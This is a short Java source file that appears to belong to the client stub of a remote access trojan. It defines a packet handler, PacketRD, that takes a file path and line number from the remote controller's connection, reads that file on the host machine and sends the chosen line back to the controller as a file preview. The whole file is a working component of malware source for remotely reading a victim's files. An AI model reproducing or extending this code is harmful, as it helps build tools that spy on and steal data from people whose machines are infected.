package com.redpois0n.packets.incoming;

import java.io.BufferedReader;
import java.io.FileInputStream;
import java.io.InputStreamReader;

import com.redpois0n.Connection;
import com.redpois0n.stub.packets.outgoing.Packet42FilePreview;


public class PacketRD extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {
		String file = Connection.readLine();
		int l = Connection.readInt();
		int readed = 0;
		BufferedReader reader = new BufferedReader(new InputStreamReader(new FileInputStream(file)));
		
		String line;
		
		while ((line = reader.readLine()) != null) {
			if (readed++ == l) {
				Connection.addToSendQueue(new Packet42FilePreview(file, line));
				break;
			}
		}
		reader.close();
	}

}
